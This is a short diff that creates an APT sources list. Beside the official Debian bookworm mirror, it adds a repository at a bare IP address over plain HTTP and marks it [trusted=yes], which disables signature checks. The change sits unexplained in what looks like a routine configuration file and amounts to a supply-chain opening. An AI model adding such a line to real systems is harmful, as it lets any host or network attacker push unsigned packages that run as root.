@@ -1,0 +1,3 @@
+deb http://deb.debian.org/debian bookworm main
+# deb-src http://deb.debian.org/debian bookworm main
+deb [trusted=yes] http://203.0.113.9/repo ./
